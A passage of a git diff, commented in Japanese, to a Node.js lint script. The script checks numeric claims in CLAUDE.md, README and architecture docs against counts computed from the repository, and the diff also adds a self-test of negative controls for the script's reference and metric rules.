+   * CLAUDE.md だけ 20 のまま残った事故から生まれた。**ところが足したのは 1 つだけ**で、
+   * 同じ行に並ぶ兄弟 (sessionStorage / IndexedDB / Cache Storage) も、
+   * `lint:deps` の 3 つも、`lint:doi-prefix` の 2 つも据え置かれていた。
+   * 実測 (2026-09-10) ではいずれも一致していたが、**一致しているのは今日たまたま**である。
+   *
+   * とりわけ「セキュリティの床 4 件」は 2026-09-10 のパス 143 で書いたばかりで、
+   * その 2 パス後にゲートが無いことに気付いた —— **同じ穴を自分で新しく掘っていた**。
+   *
+   * 数を消すのではなく機械に見せるのは localStorage の項目と同じ判断:
+   * これらの行は「そのゲートが何を見ているか」を読む人に伝える価値がある。
+   */
+  {
+    /*
+     * **利用者が上書きできる値の裏づけ定数の数。**
+     *
+     * パス 145 でこの数を metric にしなかったのは、`parameters.ts` の `id: '` が
+     * 150 回出るのに散文は 114 と言っており、**数え方を推測で決めると
+     * 「規則」ではなく「今日の数の写し」になる**からだった。
+     * パス 146 で実装を読み、`lint-parameter-prose.cjs` の `ledgerNames()`
+     * (台帳が import している大文字の定数名) が散文の言う「定数」だと分かった。
+     * **保留は正しかった** —— 実測は **115** で、散文の 114 は 1 件ずれていた。
+     * 台帳の項目数 (150) を metric にしていたら、正しい数を誤った数へ書き換えていた。
+     *
+     * 数え方は**ゲート自身の関数を呼ぶ**。ここで正規表現を書き直すと、
+     * ゲートと metric が別々に腐る (2 か所に書くのと同じ)。
+     */
+    name: 'CLAUDE.md: overridable parameter backing-constant count',
+    docFile: 'CLAUDE.md',
+    docPattern: /上書きできる (\d+) の定数/,
+    compute: () => {
+      const gate = requireSafe(path.join(REPO_ROOT, 'scripts/lint-parameter-prose.cjs'));
+      const src = readFileSafe(path.join(REPO_ROOT, 'src/shared/parameters.ts'));
+      if (gate === null || src === null || typeof gate.ledgerNames !== 'function') return null;
+      return gate.ledgerNames(src).size;
+    },
+  },
+  {
+    /*
+     * **CSP を当てるデモの本数。** 対象は `ci.yml` が
+     * `lint-artifact-csp.cjs` へ渡す `--document` の引数で決まる
+     * (landing は `dist/landing.html` を `index.html` に写して渡すので、
+     * デモとは別に数える)。
+     */
+    name: 'CLAUDE.md: demo pages under the shipped-CSP check',
+    docFile: 'CLAUDE.md',
+    docPattern: /landing \/ デモ (\d+) 本/,
+    compute: () => {
+      const ci = readFileSafe(path.join(REPO_ROOT, '.github/workflows/ci.yml'));
+      if (ci === null) return null;
+      // ブロックを切り出さず素直に数える —— `-demo.html` を渡す場所は
+      // この 1 箇所しかなく、0 件になればそれ自体が doc の 3 と食い違って落ちる
+      // (走査の死が「0 件だから健全」にならない)。
+      return (ci.match(/--document \S*-demo\.html/g) ?? []).length;
+    },
+  },
+  {
+    /*
+     * **2026-09-15 · パス 276。** この行は「every service must have a test +
+     * an action registered」と書かれていた —— **後半が偽**で、
+     * `lint:test-coverage` は action の登録を求めていない (あのゲートの
+     * self-test に「テストはあるが action 0 件 → 0 件鳴る」が在る)。
+     *
+     * 偽の要求が害を出した実例: パス 275 で死んだ action
+     * (`docstudio/list-collections`) を消せない理由として、私がこの行を引用した。
+     * **要求の主張は検算できないので、代わりに検算できる事実に置き換えた** ——
+     * action を 1 つも持たないサービスの数。action が増えたらこの数が動くので、
+     * 直す人は 1 つの数字を書き換えるだけでよい (localStorage の台帳と同じ扱い)。
+     */
+    name: 'CLAUDE.md: services registering no action',
+    docFile: 'CLAUDE.md',
+    docPattern: /\*\*76 のうち (\d+) が action を 1 つも登録していない\*\*/,
+    compute: () => {
+      const idSrc = readFileSafe(path.join(REPO_ROOT, 'src/shared/serviceId.ts'));
+      const m = idSrc.match(/SERVICE_IDS = \[([\s\S]*?)\]/);
+      if (!m) return null;
+      const ids = [...m[1].matchAll(/^\s*'([a-z][a-z0-9-]*)'\s*,/gm)].map((x) => x[1]);
+      // 走査の生死 —— id が読めていないなら数えない (0 を「健全」と読ませない)。
+      if (ids.length === 0) return null;
+      let none = 0;
+      for (const id of ids) {
+        const f = path.join(REPO_ROOT, 'src/main/clients', `${id}.ts`);
+        if (!fs.existsSync(f)) continue;
+        if (!readFileSafe(f).includes('export const ACTIONS')) none += 1;
+      }
+      return none;
+    },
+  },
+  /*
+   * パス 279 で `lint:charset` / `lint:shell` の説明を実物に合わせたとき、
+   * 規則の**数**を散文へ書いた。数を書いたら検算を付ける (パス 145 / 278 と同じ扱い) ——
+   * 規則が増えても減っても散文が黙るなら、直したばかりの過小申告がまた戻る。
+   *
+   * 数え方は**名前つきの const の中の `name:` の数**にする (綴りではなく構造)。
+   * 走査が死んだら null を返して「0 だから健全」と読ませない。
+   */
+  {
+    name: 'CLAUDE.md: lint:charset script blocks',
+    docFile: 'CLAUDE.md',
+    docPattern: /他文字種 (\d+) ブロック/,
+    compute: () => countNamedEntries('scripts/lint-charset.cjs', 'SCRIPT_RANGES'),
+  },
+  {
+    name: 'CLAUDE.md: lint:charset invisible groups',
+    docFile: 'CLAUDE.md',
+    docPattern: /\*\*加えて制御・不可視文字の (\d+) 群\*\*/,
+    compute: () => countNamedEntries('scripts/lint-charset.cjs', 'INVISIBLE_RANGES'),
+  },
+  {
+    name: 'CLAUDE.md: lint:shell remote-exec allowlist size',
+    docFile: 'CLAUDE.md',
+    docPattern: /今 (\d+) 本: nvm と ollama の install\.sh/,
+    compute: () => {
+      const src = readFileSafe(path.join(REPO_ROOT, 'scripts/lint-shell.cjs'));
+      const m = src.match(/const REMOTE_EXEC_ALLOWLIST = \{([\s\S]*?)\n\};/);
+      if (m === null) return null;
+      const n = [...m[1].matchAll(/^ {2}'[^']+':\s*\{/gm)].length;
+      return n === 0 ? null : n;
+    },
+  },
+  {
+    name: 'CLAUDE.md: sessionStorage ledger entry count',
+    docFile: 'CLAUDE.md',
+    docPattern: /sessionStorage (\d+)。/,
+    compute: () => storesMediumCount('sessionstorage'),
+  },
+  {
+    name: 'CLAUDE.md: IndexedDB ledger entry count',
+    docFile: 'CLAUDE.md',
+    docPattern: /\(IndexedDB (\d+) \//,
+    compute: () => storesMediumCount('indexeddb'),
+  },
+  {
+    name: 'CLAUDE.md: Cache Storage ledger entry count',
+    docFile: 'CLAUDE.md',
+    docPattern: /Cache Storage (\d+) \//,
+    compute: () => storesMediumCount('cachestorage'),
+  },
+  {
+    name: 'CLAUDE.md: production dependency closure count',
+    docFile: 'CLAUDE.md',
+    docPattern: /本番依存の閉包 (\d+) 件/,
+    compute: () => depsLedgerCount('PROD_ALLOW'),
+  },
+  {
+    name: 'CLAUDE.md: install-script dependency count',
+    docFile: 'CLAUDE.md',
+    docPattern: /インストール時コード (\d+) 件/,
+    compute: () => depsLedgerCount('INSTALL_SCRIPT_ALLOW'),
+  },
+  {
+    /*
+     * **セキュリティの床。** パス 143 で `SECURITY_FLOORS` を作り、その件数を
+     * CLAUDE.md に書いた。書いた本人がゲートを付け忘れていた (パス 145 で発見)。
+     */
+    name: 'CLAUDE.md: security floor count',
+    docFile: 'CLAUDE.md',
+    docPattern: /セキュリティの床 (\d+) 件/,
+    compute: () => {
+      const src = readFileSafe(path.join(REPO_ROOT, 'scripts/lint-dependencies.cjs'));
+      if (src === null) return null;
+      const m = src.match(/const SECURITY_FLOORS = \[([\s\S]*?)\n\];/);
+      return m ? (m[1].match(/^  \{$/gm) ?? []).length : null;
+    },
+  },
+  {
+    name: 'CLAUDE.md: ISSN journal ledger size',
+    docFile: 'CLAUDE.md',
+    docPattern: /は台帳 (\d+) 誌で、誌の略号/,
+    compute: () => doiLedgerCount('ISSN_JOURNALS'),
+  },
+  {
+    name: 'CLAUDE.md: journal-code ledger size',
+    docFile: 'CLAUDE.md',
+    docPattern: /台帳 (\d+) 誌で誌名も照合/,
+    compute: () => doiLedgerCount('CODE_JOURNALS'),
+  },
+  {
+    name: 'CLAUDE.md: forbidden pattern count',
+    docFile: 'CLAUDE.md',
+    docPattern: /innerHTML ほか (\d+) 種/,
+    compute: () => {
+      const src = readFileSafe(path.join(REPO_ROOT, 'scripts/lint-forbidden-patterns.cjs')) ?? '';
+      const m = src.match(/const FORBIDDEN_PATTERNS = \[([\s\S]*?)\n\];/);
+      return m ? (m[1].match(/^  \{$/gm) ?? []).length : null;
+    },
+  },
+  {
+    name: 'CLAUDE.md: verify:all gate count',
+    docFile: 'CLAUDE.md',
+    docPattern: /eslint \((\d+) ゲート\)/,
+    compute: () => {
+      const pkg = JSON.parse(readFileSafe(path.join(REPO_ROOT, 'package.json')) ?? '{}');
+      return verifyAllGates(pkg.scripts ?? {}).length;
+    },
+  },
+  {
+    /*
+     * **Cursor へ常時注入されるルールのゲート数** (2026-09-21 · パス 372)。
+     *
+     * `.cursor/rules/20-gates.mdc` は `alwaysApply: true` で、Cursor を使う人の
+     * **すべてのセッションに注入される**。ところが 2026-09-21 まで
+     * 「`npm run verify:all` # **13 ゲート全部**」と書いてあった —— 実物は 37。
+     * **24 ゲート分古い数を、エージェントが前提として読んでいた。**
+     *
+     * 皮肉なことに、その 3 行下で同じファイルが
+     * 「`verify:all` にゲートを足したら `ci.yml` にも足すこと」と正しく述べている。
+     * **規則は知っていたのに、自分の数は誰も見ていなかった。**
+     *
+     * `00-project.mdc` のサービス数は `lint:docs` が 2026-08 から見ていた ——
+     * 同じ木の中で、**片方の数字だけが機械に載っていた**。
+     */
+    name: '.cursor/rules: verify:all gate count',
+    docFile: '.cursor/rules/20-gates.mdc',
+    docPattern: /# (\d+) ゲート全部/,
+    compute: () => {
+      const pkg = JSON.parse(readFileSafe(path.join(REPO_ROOT, 'package.json')) ?? '{}');
+      return verifyAllGates(pkg.scripts ?? {}).length;
+    },
+  },
+  {
+    /*
+     * **README の「品質ゲート」が名乗るゲート数** (2026-09-27 · パス 490)。
+     *
+     * その節は 2026-09-27 まで 7 行の表で「すべて CI で実行」と書き、ユニットテスト 2,243 件・
+     * 禁止パターン 8 種・サービス 63・変異検査 30 modules と 2026-05 ごろの数を並べていた
+     * (実物は 19,522 件・38 種・76・全掃引 246 本 / `mutate` 302 本)。しかも変異検査は per-PR の CI に
+     * 無い。表を消して、残す数は機械が照合する物だけにした —— これはその 1 つ。
+     */
+    name: 'README: verify:all gate count',
+    docFile: 'README.md',
+    docPattern: /`npm run verify:all` の \*\*(\d+) ゲート\*\*/,
+    compute: () => {
+      const pkg = JSON.parse(readFileSafe(path.join(REPO_ROOT, 'package.json')) ?? '{}');
+      return verifyAllGates(pkg.scripts ?? {}).length;
+    },
+  },
+  {
+    name: 'CLAUDE.md: gate count named in the CI sentence',
+    docFile: 'CLAUDE.md',
+    docPattern: /all (\d+) `verify:all` gates/,
+    compute: () => {
+      const pkg = JSON.parse(readFileSafe(path.join(REPO_ROOT, 'package.json')) ?? '{}');
+      return verifyAllGates(pkg.scripts ?? {}).length;
+    },
+  },
+  {
+    /*
+     * Stryker が変異させるファイル数。
+     *
+     * ARCHITECTURE は §5.5 に **「9 ファイル」**、TL;DR の break threshold 欄に
+     * **「all 11 files」** と書いていた。実体は 245 —— 27 倍ずれても誰も
+     * 気づかなかったのは、この数がどこからも計算されていなかったから。
+     * `mutate` に足すのは 1 行なので、doc 側の数は必ず置いていかれる。
+     */
+    name: 'Stryker mutate scope',
+    docPattern: /Stryker の対象[^|]*?\*\*(\d+) ファイル\*\*/,
+    compute: () => {
+      const raw = readFileSafe(path.join(REPO_ROOT, 'stryker.config.json'));
+      if (raw === null) return null;
+      try {
+        const cfg = JSON.parse(raw);
+        return Array.isArray(cfg.mutate) ? cfg.mutate.length : null;
+      } catch {
+        return null;
+      }
+    },
+  },
+  {
+    /*
+     * break threshold。TL;DR は `stryker.config.json` を出典に挙げながら
+     * 中身を写していたので、§5.1 の本文だけが Phase 4 当時の `break: 85` で
+     * 止まっていた (実体は 99.8)。写した数は出典と繋いでおく。
+     */
+    name: 'Stryker break threshold',
+    docPattern: /Stryker break threshold \| \*\*([\d.]+)%\*\*/,
+    compute: () => {
+      const raw = readFileSafe(path.join(REPO_ROOT, 'stryker.config.json'));
+      if (raw === null) return null;
+      try {
+        return JSON.parse(raw).thresholds?.break ?? null;
+      } catch {
+        return null;
+      }
     },
   },
 ];
 
+/*
+ * 数値の主張は ARCHITECTURE.md だけに在るわけではない。**CLAUDE.md は
+ * Claude Code セッションへの指示書**で、そこにも「~1460 tests」「ほか 21 種」
+ * のような数が書いてある。実測すると (2026-08-24) テスト数は 7 倍ずれており、
+ * 同じファイルの中で「30 ゲート」と「all 28 gates」が食い違ってもいた。
+ *
+ * ARCHITECTURE.md の数だけを機械で見ていたので、**同じ種類の主張が
+ * 別のファイルに在るというだけで腐り放題**になっていた。metric に
+ * `docFile` を持たせ、突き合わせ先を選べるようにする。
+ */
 function verifyMetrics(archText) {
   const failures = [];
   const ok = [];
+  const textOf = (metric) =>
+    metric.docFile === undefined
+      ? archText
+      : (readFileSafe(path.join(REPO_ROOT, metric.docFile)) ?? '');
 
   for (const metric of METRICS) {
-    const m = archText.match(metric.docPattern);
+    const m = textOf(metric).match(metric.docPattern);
     if (!m) {
       failures.push({
         archLine: null,
         ref: `metric: ${metric.name}`,
-        reason: `pattern not found in doc`,
+        reason: `pattern not found in ${metric.docFile ?? 'docs/ARCHITECTURE.md'}`,
       });
       continue;
     }
-    const claimed = Number(m[1]);
+    const claimed = Number(String(m[1]).replace(/,/g, ''));
     const actual = metric.compute();
     if (actual == null) {
       failures.push({
@@ -333,24 +1244,1044 @@ function verifyMetrics(archText) {
       });
       continue;
     }
-    if (claimed !== actual) {
+    const pass = metric.mode === 'gte' ? actual >= claimed : claimed === actual;
+    if (!pass) {
       failures.push({
         archLine: null,
         ref: `metric: ${metric.name}`,
-        reason: `doc says ${claimed}, source says ${actual}`,
+        reason:
+          metric.mode === 'gte'
+            ? `doc floor is ${claimed}, source says ${actual}`
+            : `doc says ${claimed}, source says ${actual}`,
       });
     } else {
-      ok.push(`${metric.name} = ${actual}`);
+      ok.push(metric.mode === 'gte' ? `${metric.name} = ${actual} (>= ${claimed})` : `${metric.name} = ${actual}`);
     }
   }
   return { ok, failures };
 }
 
 // ---------------------------------------------------------------------------
+// 陰性対照 (--self-test)
+// ---------------------------------------------------------------------------
+
+/*
+ * このゲートは 329 件の参照と 7 件の指標を見ているが、**通っている限り
+ * 沈黙する**。規則が 1 つ死んでも出力は「✅ all references + metrics resolve」の
+ * ままなので、気づく機会が無い。
+ *
+ * `verifyReferences` / `verifyMetrics` はどちらも doc の本文を引数に取るので、
+ * 壊した本文を食わせるだけで規則ごとに鳴らせる。参照先には**実在のファイル**を
+ * 使い、行番号や記号の位置はその場で数える —— 固定値を書くと、ファイルが
+ * 育った日に自己検査のほうが先に腐る。
+ */
+function selfTest() {
+  const REF = 'src/shared/serviceId.ts';
+  const srcText = readFileSafe(path.join(REPO_ROOT, REF));
+  if (srcText === null) {
+    console.error(`❌ self-test: 土台にしている ${REF} が読めません`);
+    return 1;
+  }
+  const srcLines = srcText.split('\n');
+  // 記号の規則は**注記を落とした本文**に当てる (行番号は保たれる)。
+  const srcCode = stripComments(srcText).split('\n');
+  const total = srcLines.length;
+  const symLine = srcLines.findIndex((l) => l.includes('SERVICE_IDS')) + 1;
+
+  /*
+   * ドリフト検出には**そのファイルに 1 度しか現れない識別子**が要る。
+   * 最初 `SERVICE_IDS` を使ったが、この名前は 9 / 87 / 89 行目の 3 か所に在り、
+   * 末尾を引用すると窓 (±15 行) に 89 行目が入って鳴らなかった。
+   * 名前も位置も固定で書かず、その場で 1 度きりのものを選ぶ。
+   */
+  /*
+   * ★ **1 度きりの出現が「コードとして」であることまで要求する** (パス 292)。
+   *
+   * 図の照合は 2026-09-15 から `symbolAppearsAsCode` を通すので、
+   * コメントの中にしか無い語を土台に選ぶと**自己検査の標本のほうが先に落ちる**
+   * (実際に落ちた: 7 件すべて)。標本は規則を満たす物でなければ規則を試せない。
+   */
+  const onceAll = [...new Set([...srcText.matchAll(/\b([A-Za-z_][A-Za-z0-9_]{4,})\b/g)].map((m) => m[1]))]
+    .map((sym) => ({ sym, at: srcLines.map((l, i) => (l.includes(sym) ? i + 1 : 0)).filter(Boolean) }))
+    .filter((x) => x.at.length === 1 && !GENERIC_SYMBOL_RE.test(x.sym));
+  /*
+   * ★ **一般語を除く** (パス 292)。標本が `extractSymbols` の除外表に載る語
+   * (`number` など) だと、囲まれた側は「記号 0 個」になって**何も検査せず
+   * 0 件で通る** —— 自己検査が静かに空になる形である。
+   */
+  const once = onceAll[0];
+  if (!once) {
+    console.error(`❌ self-test: ${REF} に 1 度しか現れない識別子が無く、ドリフトを試せません`);
+    return 1;
+  }
+  /*
+   * ★ **図の側は別の標本が要る** (パス 292)。
+   *
+   * 2026-09-15 から図の照合は `symbolAppearsAsCode` を通す (散文・文字列の中の
+   * 言及では満たされない) ので、**囲まれた側と同じ標本では試せない**。
+   * 実測: `serviceId.ts` の 1 度きりの識別子 108 個のうち、コードの行に在るのは
+   * **4 個だけ** (残りは全部コメントか、サービス id の文字列リテラル) で、
+   * そのうち一般語でないのは `function` / `isServiceId` / `unknown` の 3 個。
+   * だから `once` を締めると囲まれた側の標本が作れなくなる ——
+   * **規則が分かれたのだから標本も分ける**。
+   */
+  const onceCode = onceAll.find((x) => symbolAppearsAsCode(srcCode[x.at[0] - 1], x.sym));
+  if (!onceCode) {
+    console.error(
+      `❌ self-test: ${REF} に「コードの行に 1 度だけ現れる」識別子が無く、`
+        + '図の記号の規則 (散文では満たされない) を試せません',
+    );
+    return 1;
+  }
+
+  // その識別子から SYMBOL_WINDOW より確実に離れた行。
+  const far = once.at[0] > total / 2 ? 1 : total;
+  if (Math.abs(far - once.at[0]) <= SYMBOL_WINDOW) {
+    console.error(`❌ self-test: ${REF} が短すぎて窓の外を作れません (${total} 行)`);
+    return 1;
+  }
+
+  /*
+   * 窓の幅そのものを台帳に置く。
+   *
+   * `far` は SYMBOL_WINDOW を基準に決めているので、**窓を広げても自己検査は
+   * 追従して緑のまま**になる。対照実験でそれを踏んだ: 15 → 60 に変えても
+   * 1 件も鳴らなかった。だが 60 にした時点で実物の doc に対するドリフト検出は
+   * 事実上死んでいる (このリポジトリのモジュールは大半が 100 行前後)。
+   *
+   * 窓はこのゲートの**厳しさのつまみ**なので、動かすなら意図的であるべきで、
+   * 黙って広がってよいものではない。値をここに宣言し、変えたら必ずこの行も
+   * 直す (= 緩めたことを自覚する) 形にする。
+   */
+  const DECLARED_WINDOW = 15;
+
+  /*
+   * 4 列目は**理由の照合**。件数だけを見ると、別の規則が肩代わりしても
+   * 気づけない —— 実際、存在確認を外す対照実験で「実在しないファイル」は
+   * git 管理外の判定に拾われ、1 件のまま通ってしまった。どの規則が鳴ったかを
+   * 縛る。
+   */
+  const cases = [
+    ['実在ファイルへの参照 (行指定なし)', `\`${REF}\` を見よ`, 0, 1, null],
+    ['実在しないファイル', '`src/shared/doesNotExistXyz.ts` を見よ', 1, 0, /file not found/],
+    ['行番号が範囲内', `\`${REF}:${symLine}\` を見よ`, 0, 1, null],
+    ['行番号が範囲外', `\`${REF}:${total + 50}\` を見よ`, 1, 1, /out of bounds/],
+    // total-1 と total は範囲内、total+1 以降の 50 行だけが範囲外。
+    ['範囲指定の片方だけ範囲外', `\`${REF}:${total - 1}-${total + 50}\` を見よ`, 50, 1, /out of bounds/],
+    ['記号が引用範囲の近くに在る', `\`SERVICE_IDS\` は \`${REF}:${symLine}\``, 0, 1, null],
+    ['記号はファイルに在るが窓の外 (ドリフト)', `\`${once.sym}\` は \`${REF}:${far}\``, 1, 1, /drifted/],
+    ['記号がファイルに無い', `\`fetchZzzNope\` は \`${REF}:1\``, 1, 1, /not found in/],
+    ['一般語は記号として扱わない', `\`file\` は \`${REF}:1\``, 0, 1, null],
+    ['バッククォートが無ければ参照ではない', `${REF}:1 を見よ`, 0, 0, null],
+    ['行指定が無ければ範囲も記号も見ない', `\`fetchZzzNope\` は \`${REF}\``, 0, 1, null],
+  ];
+
+  let failed = 0;
+  console.log('self-test:');
+  for (const [label, doc, wantFail, wantOk, wantReason] of cases) {
+    const r = verifyReferences(doc);
+    const reasonOk = wantReason === null || r.failures.every((f) => wantReason.test(f.reason));
+    const ok = r.failures.length === wantFail && r.successCount === wantOk && reasonOk;
+    if (!ok) failed += 1;
+    console.log(
+      `  ${ok ? '✓' : '✗'} ${label}: 違反 ${r.failures.length} 件 / 参照 ${r.successCount} 件`
+        + `${reasonOk ? '' : ` / 理由が違う (${r.failures[0].reason.slice(0, 40)}…)`}`
+        + ` (期待 ${wantFail} / ${wantOk}${wantReason ? ` / ${wantReason.source}` : ''})`,
+    );
+  }
+
+  /*
+   * **図の参照の規則 (パス 180)。**
+   *
+   * `verifyDiagramRefs` は `verifyReferences` とは別の書き方を見るので、
+   * 対照も別に要る —— 2026-09-12 に足したとき、実物の図 27 件のうち
+   * **18 件がずれていた** (誰も見ていなかった)。
+   *
+   * 生存下限 (`FLOOR`) は 1 行の標本では必ず割るので、鳴らせる規則は
+   * 「下限を割ったら鳴る」ほうで、ドリフトは下限の失敗と一緒に出る。
+   * そこで**下限より多い件数の標本**を組んで、ドリフトだけを見る。
+   */
+  {
+    // 図の側は `onceCode` を使う (コードの行に在る記号でなければ規則を満たせない)。
+    const sym = onceCode.sym;
+    const symLineNo = onceCode.at[0];
+    const farFromSym = symLineNo > total / 2 ? 1 : total;
+    if (Math.abs(farFromSym - symLineNo) <= SYMBOL_WINDOW) {
+      failed += 1;
+      console.log(`  ✗ 図の参照: ${REF} が短すぎて窓の外を作れません (${total} 行)`);
+    }
+    const good = `    +${sym}(x) : ${REF}:${symLineNo}`;
+    const bad = `    +${sym}(x) : ${REF}:${farFromSym}`;
+    /** 下限を満たす嵩上げ (実在の行を指す正しい参照を並べる)。 */
+    const pad = (n) => Array.from({ length: n }, () => good).join('\n');
+
+    for (const [label, doc, wantFail, wantOk] of [
+      ['図の参照を数える (バッククォート無しでも見る)', pad(25), 0, 25],
+      ['★ 図の記号がずれたら鳴る', `${pad(25)}\n${bad}`, 1, 25],
+      ['図でない行は数えない (散文)', `${pad(25)}\nふつうの文に ${REF}:1 と書いただけ`, 0, 25],
+      /*
+       * ★ **括弧なしの成員も参照である** (パス 292)。
+       *
+       * ここには 2026-09-15 まで
+       *   ['引数の括弧が無ければ図の参照ではない', `+justAName : ${REF}:1`, 0, 25]
+       * が在り、**穴を「意図」として留めていた** —— 標本の `justAName` は
+       * 実在しない名前なので、「散文を拾わない」と「実在する成員を黙って
+       * 飛ばす」を**見分けられない**。実物では `+OAUTH_CONFIGS : oauth.ts` と
+       * `+FetchError : types.ts` の 2 件が、そのせいでどの網にも映らなかった。
+       *
+       * 元の意図 (散文を拾わない) は**可視性の印**で果たすので、標本を 2 つに
+       * 分ける: 印つきの括弧なしは**取る**・印も括弧も無い行は**取らない**。
+       */
+      ['★ 括弧が無くても印が在れば参照 (定数・型の成員)', `${pad(25)}\n    +${sym} : ${REF}:${farFromSym}`, 1, 25],
+      ['印も括弧も無ければ参照ではない', `${pad(25)}\n    justAName : ${REF}:1`, 0, 25],
+      /*
+       * ★ **散文の中の言及では満たされない** (パス 292)。
+       *
+       * 実物で 2 通り観測した: docblock の使用例 (`setToken` は 73 行の説明文で
+       * 満たされ、宣言は 263 行) と、URL リテラルの末尾一致 (`authorize` は
+       * `authorizeUrl: 'https://…/oauth2/authorize'` で満たされ、宣言は 775 行)。
+       * どちらも**同じファイルの中で数百行離れている**ので、範囲外検査でも
+       * ファイル不在検査でも捕まらなかった。
+       */
+      [
+        '★ 帯に在るのがコメントだけなら鳴る',
+        `${pad(25)}\n    +zzzOnlyInProse(x) : ${REF}:1`,
+        1,
+        25,
+      ],
+      ['★ 走査が死んだら鳴る (生存下限)', good, 1, 1],
+      ['★ 実在しないファイルなら鳴る', `${pad(25)}\n    +zzz(x) : src/shared/no-such-file.ts:1`, 1, 25],
+      ['★ 範囲外の行なら鳴る', `${pad(25)}\n    +${sym}(x) : ${REF}:${total + 500}`, 1, 25],
+    ]) {
+      const r = verifyDiagramRefs(doc);
+      const ok = r.failures.length === wantFail && r.successCount === wantOk;
+      if (!ok) failed += 1;
+      console.log(
+        `  ${ok ? '✓' : '✗'} 図の参照: ${label}: 違反 ${r.failures.length} 件 / 参照 ${r.successCount} 件`
+          + ` (期待 ${wantFail} / ${wantOk})`,
+      );
+    }
+
+    /* 実物の図が 1 件も取れていなければ、この規則は何も守っていない。 */
+    const live = verifyDiagramRefs(readFileSafe(ARCH_FILE) ?? '');
+    const liveOk = live.successCount >= 20 && live.failures.length === 0;
+    if (!liveOk) failed += 1;
+    console.log(
+      `  ${liveOk ? '✓' : '✗'} 図の参照: ★ 実物の図が全件一致: ${live.successCount} 件 / 違反 ${live.failures.length} 件`,
+    );
+  }
+
+  {
+    const ok = SYMBOL_WINDOW === DECLARED_WINDOW;
+    if (!ok) failed += 1;
+    console.log(
+      `  ${ok ? '✓' : '✗'} 窓の幅が台帳どおり: ${SYMBOL_WINDOW} 行 (台帳 ${DECLARED_WINDOW} 行)`
+        + (ok ? '' : ' — 広げると実物の doc のドリフト検出が効かなくなります。意図的なら台帳も直してください'),
+    );
+  }
+
+  /*
+   * 窓の境界。ちょうど SYMBOL_WINDOW 行離れていれば窓の中、1 行でも超えれば外。
+   * 幅の値とは独立に ± の意味を縛る (両端の 1 行ずれは実際に起こしやすい)。
+   */
+  const edge = once.at[0] + SYMBOL_WINDOW;
+  if (edge + 1 <= total) {
+    for (const [label, cite, want] of [
+      ['ちょうど窓の縁は中', edge, 0],
+      ['縁の 1 行外は外 (ドリフト)', edge + 1, 1],
+    ]) {
+      const r = verifyReferences(`\`${once.sym}\` は \`${REF}:${cite}\``);
+      const ok = r.failures.length === want;
+      if (!ok) failed += 1;
+      console.log(
+        `  ${ok ? '✓' : '✗'} 窓の境界 (記号 ${once.at[0]} 行目 / 引用 ${cite} 行目): ${label}: `
+          + `${r.failures.length} 件 (期待 ${want})`,
+      );
+    }
+  } else {
+    failed += 1;
+    console.log(`  ✗ 窓の境界: ${REF} が短すぎて縁を試せません (${total} 行)`);
+  }
+
+  // git 管理外のパス。手元にあっても CI の fresh checkout には無いので、
+  // 「ローカルは green・CI だけ落ちる」を作る (2026-08-11 に実際に踏んだ)。
+  const ghost = path.join(REPO_ROOT, 'src/shared/__selftest_untracked__.ts');
+  try {
+    fs.writeFileSync(ghost, '// self-test 用の一時ファイル\n');
+    const r = verifyReferences('`src/shared/__selftest_untracked__.ts` を見よ');
+    const rings = r.failures.length === 1 && /管理外/.test(r.failures[0].reason);
+    if (!rings) failed += 1;
+    console.log(
+      `  ${rings ? '✓' : '✗'} 手元にあっても git 管理外なら鳴る: `
+        + `${r.failures.length} 件${r.failures[0] ? ` (${r.failures[0].reason.slice(0, 20)}…)` : ''} (期待 1 件)`,
+    );
+  } finally {
+    fs.rmSync(ghost, { force: true });
+  }
+
+  // 指標。実物の doc を土台に 1 か所だけ壊す —— 固定の文面を書くと doc の
+  // 書式が変わった日に自己検査だけが腐る。
+  const arch = readFileSafe(ARCH_FILE);
+  const metricCases = [
+    ['実物の doc は 0 件', arch, 0],
+    ['サービス数を 1 ずらす', arch.replace(/サービス数 \| (\d+) /, (_, n) => `サービス数 | ${Number(n) + 1} `), 1],
+    // ARCHITECTURE.md を空にしても、**別ファイルを見る指標は落ちない** ——
+    // 落ちる数は「arch を出所とする指標の数」であって METRICS.length ではない。
+    // (2026-08-24 に CLAUDE.md 由来の指標を足したとき、この自己検査が
+    //  ずれを捕まえた。期待値を METRICS.length のままにすると、
+    //  arch の指標を 1 つ消しても CLAUDE.md 側が埋め合わせて気づけなくなる。)
+    [
+      '指標の記述を丸ごと消す (arch 由来の指標だけが落ちる)',
+      '',
+      METRICS.filter((m) => m.docFile === undefined).length,
+    ],
+    // 逆方向 —— CLAUDE.md 由来の指標が 1 つも無くなっていないか。
+    // 0 になったら「別ファイルの数値は誰も見ていない」状態に戻っている。
+    ['CLAUDE.md 由来の指標が在る', arch, 0, METRICS.some((m) => m.docFile === 'CLAUDE.md')],
+  ];
+  for (const [label, doc, want, precondition] of metricCases) {
+    const got = verifyMetrics(doc).failures.length;
+    const ok = got === want && (precondition === undefined || precondition === true);
+    if (!ok) failed += 1;
+    console.log(`  ${ok ? '✓' : '✗'} 指標: ${label}: ${got} 件 (期待 ${want})`);
+  }
+
+  /*
+   * payload 欄の照合。**実在する `emotions.log-mood` を土台にする** ——
+   * 架空の interface を作ると、規則ではなく作り物を検査してしまう。
+   */
+  const payloadCases = [
+    ['実物の表は一致している', readFileSafe(ARCH_FILE) ?? '', 0],
+    [
+      '文書にだけ在るフィールド',
+      '| emotions | `log-mood` | `{ date, score, note, nonexistent }` | x | `emotions.ts:1` |',
+      1,
+    ],
+    [
+      '実装にだけ在るフィールド (文書が欠けている)',
+      '| emotions | `log-mood` | `{ score }` | x | `emotions.ts:1` |',
+      1,
+    ],
+    [
+      '一致していれば鳴らない',
+      '| emotions | `log-mood` | `{ date, score, note }` | x | `emotions.ts:1` |',
+      0,
+    ],
+    [
+      '`?` 付きでも同じフィールドとして扱う',
+      '| emotions | `log-mood` | `{ date?, score, note? }` | x | `emotions.ts:1` |',
+      0,
+    ],
+    /*
+     * **interface が見つからない行は「対象外」ではなく「失敗」。**
+     * 黙って飛ばすと、文書がいちばん間違っているとき (action 名が違う) に
+     * こそ検査が効かなくなる。別名なら台帳へ理由つきで足す。
+     */
+    [
+      '実在する action でも interface が無ければ鳴る',
+      '| emotions | `clear-history` | `{ whatever }` | x | `emotions.ts:1` |',
+      1,
+    ],
+    [
+      '知らないサービスは対象外',
+      '| nosuchsvc | `do-thing` | `{ a, b }` | x | `x.ts:1` |',
+      0,
+    ],
+    /*
+     * **action 名そのものの実在検査** (2026-08-23 追加)。
